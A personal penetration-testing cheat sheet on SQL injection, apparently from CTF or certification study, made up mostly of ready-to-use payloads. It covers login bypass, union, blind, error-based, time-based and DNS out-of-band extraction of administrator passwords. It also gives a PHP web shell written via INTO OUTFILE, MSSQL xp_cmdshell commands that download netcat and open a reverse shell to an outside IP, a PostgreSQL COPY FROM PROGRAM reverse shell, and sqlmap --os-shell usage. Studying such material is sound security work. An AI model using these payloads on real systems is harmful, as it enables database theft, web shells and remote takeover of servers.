# 💉 SQL Injection

## [SQL Injection Cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Login Bypass

Try [seclists wordlist](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt?source=post\_page-----c95930e9523d--------------------------------) for sql

Favourite:

```
'OR '' = '
```

## SQL Basics

* Create database
  * `CREATE DATABASE users;`
* Creating a table

```
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );
```

Input longer than 100 characters will give error

* To output table structure `DESCRIBE table_name;`

**Table properties**

* To auto increment a column, here id for example `id INT NOT NULL AUTO_INCREMENT,`
* To have unique and not null value `username VARCHAR(100) UNIQUE NOT NULL,`
* To set default value `date_of_joining DATETIME DEFAULT NOW(),`
* To set primary key `PRIMARY KEY (id)`

#### Statements

* To insert into tables: `INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);`
* To insert selectively `INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);`
* DROP to remove tables and databases.
* ALTER to change the name of any table and any of its fields or to delete or add a new column to an existing table : `ALTER TABLE logins ADD newColumn INT;` Rename: `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;` Change datatype : `ALTER TABLE logins MODIFY oldColumn DATE;` Drop column: `ALTER TABLE logins DROP oldColumn;`
* UPDATE statement can be used to update specific records within a table, based on certain conditions general syntax is `UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;`
  * Example: `UPDATE logins SET password = 'change_password' WHERE id > 1;`

#### Query Results

* **Sorting results**:
  * Order by column: `SELECT * FROM logins ORDER BY password DESC;` can also omit desc or asc. Can also sort with multiple columns
* **Limit to limit no of results**: `SELECT * FROM logins LIMIT 2;` Can also set an offset to limit from `SELECT * FROM logins LIMIT 1, 2;`. This limits from the id 2 excluding 1.
* **WHERE Clause** Used to specify a condition like so `SELECT * FROM table_name WHERE <condition>;`
* **Like Clause** To match a certain pattern
  * `SELECT * FROM logins WHERE username LIKE 'admin%';` % is a wildcard.
  * To match with 3 no of characters do this: `SELECT * FROM logins WHERE username like '___';`

## SQL Injection

### Miscellaneous

In oracle databases there is always a table called `dual`.

To **concatenate** two columns use `CONCAT` or `col1 || '~' || col2`

To check for the requests use ffuf: Example:

```
ffuf -u https://watch.streamio.htb/search.php -d "q=FUZZ" -w /usr/share/seclists/Fuzzing/special-chars.txt -H 'Content-Type: application/x-www-form-urlencoded' -k
```

Usually when database is searched it is in the format of:

```
select * from movies where title like '%[input]%';
orselect * from movies where CONTAINS (name, '*500*')l;
```

Use of sql in php:

```
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
```

F or example if a login form is as follows: `SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';`

## Discovery

To test for SQLi add any of these and check for errors:

| Payload                                                                                                                                                                        | Url Encoded |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------- |
| '                                                                                                                                                                              | %27         |
| "                                                                                                                                                                              | %22         |
| #                                                                                                                                                                              | %23         |
| ;                                                                                                                                                                              | %3B         |
| )                                                                                                                                                                              | %29         |
| **Note**: In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'. |             |

### OR injection

AND operator would be evaluated before the OR operator. This means that if there is at least one TRUE condition in the entire query along with an OR operator, the entire query will evaluate to TRUE since the OR operator returns TRUE if one of its operands is TRUE.

So can inject the following: \`

\` !\[\[SQL & SQL Injection.png]] The AND operator will be evaluated first, and it will return false. Then, the OR operator would be evalutated, and if either of the statements is true, it would return true. Since 1=1 always returns true, this query will return true, and it will grant us access.

### Comments

We can use two types of line comments with MySQL `--` and `#`, in addition to an in-line comment `/**/`

Example using `--`: `SELECT username FROM logins; -- Selects usernames from the logins table`

**Note**: In SQL, using two dashes only is not enough to start a comment. There has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at at the end (-- -), to show the use of a space character.

Example using `#`: `mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'`

**Note:** if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.

So auth bypass with previous example would look like `SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';`

**SQL also has parenthesis for precedence:** !\[\[SQL & SQL Injection-1.png]] The above query ensures that the user's id is always greater than 1, which will prevent anyone from logging in as admin.

### Union

Union can be used as follows:

```
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

The above query would return username and password entries from the passwords table, assuming the products table has two columns.

Use junk data if columns are **uneven**:

```
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

here 2 is junk data

## Union Injection

There are two methods of detecting the number of columns:

* **Using ORDER BY** Keep increasing till an error is caused. If 4 caused an error then 3 columns are present

```sql
' order by 1-- -
```

* **Using UNION** Keep adding junk columns till error.

```sql
cn' UNION select 1,2,3-- -`
```

Not every column is shown to the user so to test which columns are shown can use @@version:

```sql
cn' UNION select 1,@@version,3,4-- -
```

!\[\[SQL & SQL Injection-2.png]]

To check for MySQL:

| Payload          | When to Use                    | Expected Output                                   | Wrong Output                                              |                                  |
| ---------------- | ------------------------------ | ------------------------------------------------- | --------------------------------------------------------- | -------------------------------- |
| SELECT @@version | When we have full query output | MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1'     | In MSSQL it returns MSSQL version. Error with other DBMS. |                                  |
| SELECT POW(1,1)  | When we on                     | When we only have numeric output                  | 1                                                         | <p>Error with other DBMS<br></p> |
| SELECT SLEEP(5)  | Blind/No Output                | Delays page response for 5 seconds and returns 0. | Will not delay response with other DBMS                   |                                  |

To check for the column that holds string value:

```sql
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```

* In **oracle** there is a builtin table called **DUAL**

Checking versions:

|                  |                           |
| ---------------- | ------------------------- |
| Database type    | Query                     |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

### Reading Files

To get useful information:

```sql
`' UNION SELECT username, password FROM users--`
```

To combine columns into one using concatenation:

```sql
' UNION SELECT username || '~' || password FROM users--
```

To check tables in non-oracle databases:

```sql
SELECT * FROM information_schema.tables
```

Column in each table in non-oracle databases:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

To find current user use any of the following :

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

For example the union injection in the previous example would be:

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

or

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

To check for super admin privileges:

```sql
SELECT super_priv FROM mysql.user
```

in Union injection:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

If Y then true

To show other privileges:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

But to show specific user privileges:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

To load files:

```sql
SELECT LOAD_FILE('/etc/passwd');
```

In union injection:

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

Can also get source code:

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

### INFORMATION\_SCHEMA Database

Check tables in current database:

```SQL
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

The INFORMATION\_SCHEMA database contains metadata about the databases and tables present on the server.

To reference table in other database use :

```sql
SELECT * FROM my_database.users;
```

The table SCHEMATA in the INFORMATION\_SCHEMA database contains information about all databases on the server: The schema\_name column contains all database names

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

To find current database:

```sql
cn' UNION select 1,database(),2,3-- -
```

To get the table schema of the database called _dev_

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

The **TABLE\_NAME** column stores table names, while the **TABLE\_SCHEMA** column points to the database each table belongs to These are the tables in dev database: !\[\[SQL & SQL Injection-3.png]]

To find column names of credential table:

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

### Write File Privileges

To check:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

Or

```
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

In union inj:

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

If empty then can write to any location.

#### SELECT INTO OUTFILE

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

To write output of table to a file:

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

To write anyyyything:

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

**Tip**: Advanced file exports utilize the 'FROM\_BASE64("base64\_data")' function in order to be able to write long/advanced files, including binary data.

**Note**: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use load\_file to read the server configuration, like Apache's configuration found at /etc/apache2/apache2.conf, Nginx's configuration at /etc/nginx/nginx.conf, or IIS configuration at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using this wordlist for Linux or this wordlist for Windows. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

#### Writing a Web Shell

We can write this : `<?php system($_REQUEST[0]); ?>` In Union injection:

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

Now to execute commands: `http://SERVER_IP:PORT/shell.php?0=id` To access files with shell:

```sql
 cn' union select "",'<?php system("dir ")); ?>', "","","" into outfile '/var/www/html/shell.php'-- -
```

## Blind SQL injection

The sql injection can be in a cookie too.

* To check use examples like the following:

```sql
…xyz' AND '1'='1
…xyz' AND '1'='2
```

We can check the difference in the website.

* To check if table user is present:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

* Check if administrator user exists:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

* Check length of password

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

Keep increasing to find length of password

* Assume a table called Users with Password and Username as columns. To determine the first letter of the password for `Administrator` user:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

```sql
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

If this returns true then the first letter is greater than m.

* Then we can check for character `t` but it is false:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

* This returns true so first character is s for sure:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

**Note**: The `SUBSTRING` function is called `SUBSTR` sometimes.

### Error-based SQL Injection

* You may be able to induce the application to return a specific error response based on the result of a boolean expression
* You may be able to trigger error messages that output the data returned by the query. This turns blind SQL into visible ones

#### Blind SQL injection by triggering conditional errors

**We are using errors just like conditions** Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. In this case the **BOOLEAN** method does not work as we won't see a difference in the Web Application.

**NOTE:** ORACLE SPECIFIC

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

* With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.
* With the second input, it evaluates to `1/0`, which causes a divide-by-zero error. To induce an error:

```sql
' AND (SELECT CASE WHEN (1=2)THEN TO_CHAR(1/0) --
```

(TO\_CHAR IS ORACLE SPECIFIC)

To check password length:

```sql
xyz' AND (SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE 'a' END FROM Users WHERE username='administrator')=' a
```

We can use it like so:

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

Check for errors:

```sql
TrackingId=xyz' //error
TrackingId=xyz''
```

### Extracting Information from Verbose Errors

Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visible one.

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

Most of the times the data is string so trying to convert it to int will cause an error.

Checking with cast:

```sql
AND CAST((SELECT 1) AS int)--
```

`ERROR: argument of AND must be type boolean, not type integer`

We need to make it into a Boolean:

```sql
AND 1=CAST((SELECT 1) AS int)--
```

There is a character limit so delete the original trackingID and the following query:

```sql
AND 1=CAST((SELECT username FROM users) AS int)--
```

To get password:

```sql
AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

### Time Delays

Set maximum concurrent requests to 1 in Burp Suite.

| Oracle                             | `dbms_pipe.receive_message(('a'),10)` |
| ---------------------------------- | ------------------------------------- |
| Microsoft                          | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL                         | `SELECT pg_sleep(10)`                 |
| MySQL                              | `SELECT SLEEP(10)`                    |
| Example:                           |                                       |
| \`\`\`sql                          |                                       |
| 'IF (1=2) WAITFOR DELAY '0:0:10'-- |                                       |
| 'IF (1=1) WAITFOR DELAY '0:0:10'-- |                                       |
| \`\`\`                             |                                       |

Testing (PostgreSQL):

```sql
'SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

Url encode if doesn't work.

To check if administrator in the users table:

```sql
;SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Password length:

```sql
;SELECT CASE WHEN (username='administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Using this technique to get passwords 1 at a time:

```sql
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

### out-of-band (OAST) techniques

An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time.

A variety of network protocols can be used for this purpose, but typically the most effective is **DNS**. Many production networks allow free egress of DNS queries

Example (MSSQl):

```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

You can use Burp Collaborator to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```

To exfiltrate data:

```sql
`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`
```

## MSSQL

### RCE

For MSSQL on windows we can run any code in SQL injection: To get RCE:

```sql
';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- 
';EXEC xp_cmdshell "powershell wget http://192.168.45.245/nc64.exe -o C:\Users\Public\nc64.exe";--
';EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.245 4444";--
```

Using Public folder as we know it is writeable by all users.

```sql
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE;
EXEC xp_cmdshell "powershell wget http://192.168.45.245/nc64.exe -o C:\Users\Public\nc64.exe";
EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.245 4444";
```

### Impersonation

Check users we can impersonate:

```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

To impersonate:

```sql
EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
```

Verifying current user and role:

```
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

### Linked Database

```sql
SELECT srvname, isremote FROM sysservers
```

### Enable xp\_cmdshell

```sql
EXEC master.dbo.sp_configure 'show advanced options', 1;
RECONFIGURE;
```

## Sqlmap

```
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```

To use burp request as parameter pass in `-r`

Pass in parameter with `-p`

```bash
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
```

1 is a dummy value

To dump the **database**:

```bash
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
```

### To gain shell access:

time-based blind SQLi are not ideal for a shell so we will try an UNION-based SQLi example:

* First intercept the POST request and save it as a local file using burp.
* Now invoke sqlmap with `-r` parameter to use the request as a parameter:

```
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```

## Automating SQLi

To use burp request as parameter pass in `-r`

We can use sqlmap to automate this process.

Pass in parameter with `-p`

```bash
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
```

1 is a dummy value

To dump the **database**:

```bash
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
```

### To gain shell access:

time-based blind SQLi are not ideal for a shell so we will try an UNION-based SQLi example:

* First intercept the POST request and save it as a local file using burp.
* Now invoke sqlmap with `-r` parameter to use the request as a parameter:

```
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```

## For postgresql

```sql
';DROP TABLE IF EXISTS commandexec; CREATE TABLE commandexec(data text);COPY commandexec FROM PROGRAM '/usr/bin/nc.traditional -c /bin/sh 192.168.45.241 4444';--
```

## SQL Injection in different contexts

```xml
<stockCheck> 
	<productId>123</productId> 
	<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId> </stockCheck>`
```

XML:

```xml
<@dec_entities>1 UNION SELECT username || '~' || password FROM users<@/dec_entities>
```

Use hackverter

## 2nd Order SQL Injection

First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way.

Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. Also know as stored SQL injection.
